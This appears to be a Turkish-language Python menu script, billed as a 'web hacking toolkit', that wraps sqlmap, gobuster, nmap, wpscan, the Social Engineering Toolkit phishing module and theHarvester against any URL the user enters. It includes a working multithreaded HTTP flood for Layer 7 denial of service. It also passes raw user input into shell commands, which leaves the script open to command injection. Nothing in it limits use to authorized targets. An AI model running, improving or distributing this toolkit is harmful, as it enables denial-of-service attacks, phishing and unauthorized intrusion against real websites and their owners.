#!/usr/bin/env python3
import os
import sys
import time
import subprocess

def clear():
    os.system('clear')

def banner():
    clear()
    print("\033[91m")
    print(r"""
    ███████╗███████╗ ██████╗  ██████╗ ██╗███████╗████████╗██╗   ██╗
    ██╔════╝██╔════╝██╔═══██╗██╔════╝ ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
    █████╗  ███████╗██║   ██║██║  ███╗██║█████╗     ██║    ╚████╔╝ 
    ██╔══╝  ╚════██║██║   ██║██║   ██║██║██╔══╝     ██║     ╚██╔╝  
    ██║     ███████║╚██████╔╝╚██████╔╝██║███████╗   ██║      ██║   
    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚══════╝   ╚═╝      ╚═╝   
    """)
    print("             WEB HACKING TOOLKIT v8.0 - DVA1")
    print("             Kali Linux | Multi Tool Menu\n\033[0m")

def check_tool(tool_name, install_cmd):
    if subprocess.call(f"which {tool_name}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        print(f"\033[93m[*] {tool_name} kurulu değil. Kuruluyor...\033[0m")
        os.system(install_cmd)

def main_menu():
    while True:
        banner()
        print("\033[92m" + "="*60)
        print("                  ANA MENÜ - WEB HACKING TOOLKIT")
        print("="*60)
        print(" [1]  Admin Panel Finder")
        print(" [2]  SQL Injection Scanner (sqlmap)")
        print(" [3]  XSS & Vulnerability Scanner")
        print(" [4]  Directory Brute Force (Dirb / Gobuster)")
        print(" [5]  Subdomain Enumeration")
        print(" [6]  Port Scanner (Nmap)")
        print(" [7]  WordPress Scanner & Exploit")
        print(" [8]  DDoS / Flood Attack (Layer 7)")
        print(" [9]  Phishing Page Generator (SET)")
        print(" [10] Information Gathering (theHarvester)")
        print(" [0]  Çıkış")
        print("="*60 + "\033[0m")

        choice = input("\033[92mSeçim yap (0-10): \033[0m").strip()

        if choice == "0":
            print("\033[91mÇıkılıyor... Hack the Planet!\033[0m")
            sys.exit(0)
        elif choice == "1":
            admin_finder()
        elif choice == "2":
            sqlmap_attack()
        elif choice == "3":
            xss_scanner()
        elif choice == "4":
            dir_brute()
        elif choice == "5":
            subdomain_enum()
        elif choice == "6":
            nmap_scan()
        elif choice == "7":
            wp_scan()
        elif choice == "8":
            ddos_attack()
        elif choice == "9":
            phishing_menu()
        elif choice == "10":
            osint_gather()
        else:
            print("\033[91mGeçersiz seçim!\033[0m")
            time.sleep(1)

def back_to_menu():
    input("\n\033[93mAna menüye dönmek için ENTER tuşuna basın...\033[0m")

# ==================== MODÜLLER ====================

def admin_finder():
    clear()
    print("\033[91m[*] Admin Panel Finder Çalıştırılıyor...\033[0m")
    url = input("Hedef URL: ")
    check_tool("dirb", "sudo apt install dirb -y")
    os.system(f"dirb {url} /usr/share/wordlists/dirb/common.txt -r")

def sqlmap_attack():
    clear()
    print("\033[91m[*] SQLMap SQL Injection Tarayıcısı\033[0m")
    url = input("Hedef URL (örnek: https://site.com/login.php?id=1): ")
    check_tool("sqlmap", "sudo apt install sqlmap -y")
    os.system(f"sqlmap -u '{url}' --batch --risk=3 --level=3")

def xss_scanner():
    clear()
    print("\033[91m[*] XSS Tarayıcı\033[0m")
    url = input("Hedef URL: ")
    print("XSStrike veya manuel test önerilir. Basit tarama başlatılıyor...")
    # Basit örnek
    os.system(f"curl -s '{url}' | grep -o 'script'")

def dir_brute():
    clear()
    print("\033[91m[*] Directory Brute Force\033[0m")
    url = input("Hedef URL: ")
    check_tool("gobuster", "sudo apt install gobuster -y")
    os.system(f"gobuster dir -u {url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50")

def subdomain_enum():
    clear()
    print("\033[91m[*] Subdomain Enumeration\033[0m")
    domain = input("Domain (örnek: example.com): ")
    check_tool("sublist3r", "sudo apt install sublist3r -y")
    os.system(f"sublist3r -d {domain}")

def nmap_scan():
    clear()
    print("\033[91m[*] Nmap Port & Service Scan\033[0m")
    target = input("Hedef IP veya Domain: ")
    os.system(f"nmap -sV -O -sC {target}")

def wp_scan():
    clear()
    print("\033[91m[*] WordPress Scanner\033[0m")
    url = input("Hedef URL: ")
    check_tool("wpscan", "sudo apt install wpscan -y")
    os.system(f"wpscan --url {url} --enumerate u,vp,ap")

def ddos_attack():
    clear()
    print("\033[91m[*] Layer 7 DDoS / Flood Attack (Örnek)\033[0m")
    url = input("Hedef URL: ")
    threads = input("Thread sayısı (önerilen 200-500): ")
    print("Basit HTTP Flood başlatılıyor...")
    # Basit örnek (gerçek güçlü flood için ayrı tool önerilir)
    os.system(f"python3 -c 'import requests, threading, time; [threading.Thread(target=lambda: [requests.get(\"{url}\") for _ in range(1000)], daemon=True).start() for _ in range(int({threads}))]; time.sleep(30)'")

def phishing_menu():
    clear()
    print("\033[91m[*] Social Engineering Toolkit (SET) Phishing\033[0m")
    check_tool("setoolkit", "sudo apt install set -y")
    os.system("setoolkit")

def osint_gather():
    clear()
    print("\033[91m[*] OSINT Bilgi Toplama\033[0m")
    domain = input("Domain veya Email: ")
    check_tool("theHarvester", "sudo apt install theharvester -y")
    os.system(f"theHarvester -d {domain} -b all")

if __name__ == "__main__":
    # Kali araçlarını kontrol et
    print("\033[93m[*] Kali araçları hazırlanıyor...\033[0m")
    main_menu()